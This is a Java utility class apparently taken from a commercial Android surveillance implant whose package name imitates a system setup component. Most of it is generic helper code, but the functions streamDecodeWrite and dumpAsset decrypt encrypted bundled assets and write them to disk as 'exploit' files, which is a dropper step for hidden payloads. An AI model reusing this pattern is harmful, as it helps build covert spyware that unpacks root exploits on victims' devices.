/* ******************************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 *******************************************************/

package com.android.syssetup.util;

import android.content.Context;
import android.content.res.AssetManager;

import com.android.syssetup.Root;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.file.AutoFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.SecureRandom;

// TODO: Auto-generated Javadoc

/**
 * The Class Utils.
 */
public final class Utils {

	/**
	 * The debug.
	 */
	private static final String TAG = "Utils"; //$NON-NLS-1$

	private Utils() {
	}

	;

	/**
	 * Sleep.
	 *
	 * @param t ms to sleep
	 */
	public static void sleep(final int t) {
		try {
			if (Cfg.DEBUG) {
				if (t < 50) {
					Check.log(TAG + " (sleep) do you mean s? it's ms");
				}
			}
			Thread.sleep(t);
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " sleep() throwed an exception");//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The rand.
	 */
	static SecureRandom rand = new SecureRandom();

	/**
	 * Gets the unique id.
	 *
	 * @return the unique id
	 */
	public static long getRandom() {
		return rand.nextLong();
	}

	public static int[] getRandomIntArray(int size) {
		int[] r = new int[size];
		for (int i = 0; i < size; i++) {
			r[i] = rand.nextInt();
		}
		return r;
	}

	public static byte[] getRandomByteArray(int sizeMin, int sizeMax) {
		int size = rand.nextInt(sizeMax - sizeMin) + sizeMin;

		byte[] randData = new byte[size];
		rand.nextBytes(randData);

		return randData;
	}

	/**
	 * Gets the time stamp in millis.
	 *
	 * @return the time stamp
	 */
	public static long getTimeStamp() {
		return System.currentTimeMillis();
	}


	public static byte[] concat(byte[]... arrays) {
		int size = 0;
		for (int i = 0; i < arrays.length; i++) {
			size += arrays[i].length;
		}

		byte[] result = new byte[size];
		size = 0;
		for (int i = 0; i < arrays.length; i++) {
			System.arraycopy(arrays[i], 0, result, size, arrays[i].length);
			size += arrays[i].length;
		}

		return result;
	}

	public static byte[] getAsset(String asset) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + asset);
			}
			AssetManager assetManager = Status.getAppContext().getResources().getAssets();
			InputStream stream = assetManager.open(asset);
			byte[] ret = ByteArray.inputStreamToBuffer(stream, 0);
			//stream.close();

			return ret;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + e);
			}
			return new byte[]{};
		}
	}

	public static InputStream getAssetStream(String asset) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + asset);
			}
			AssetManager assetManager = Status.getAppContext().getResources().getAssets();
			InputStream stream = assetManager.open(asset);

			return stream;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + e);
			}
			return null;
		}
	}

	public static void copy(File src, File dst) throws IOException {
		InputStream in = new FileInputStream(src);
		OutputStream out = new FileOutputStream(dst);

		// Transfer bytes from in to out
		byte[] buf = new byte[1024];
		int len;
		while ((len = in.read(buf)) > 0) {
			out.write(buf, 0, len);
		}
		in.close();
		out.close();
	}

	private static boolean streamDecodeWrite(final String exploit, InputStream stream, String passphrase) {
		try {
			InputStream in = Root.decodeEnc(stream, passphrase);

			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();

			AutoFile file = new AutoFile(exploit);
			if (!file.exists() || !file.canRead()) {
				return false;
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (streamDecodeWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	public static boolean dumpAsset(String asset, String filename) {
		if (Cfg.DEBUG) {
			Check.asserts(asset.endsWith(".data"), "asset should end in .data");
		}
		InputStream stream = getAssetStream(asset);
		return streamDecodeWrite(filename, stream, Cfg.RNDDB + asset.charAt(0));
	}
}
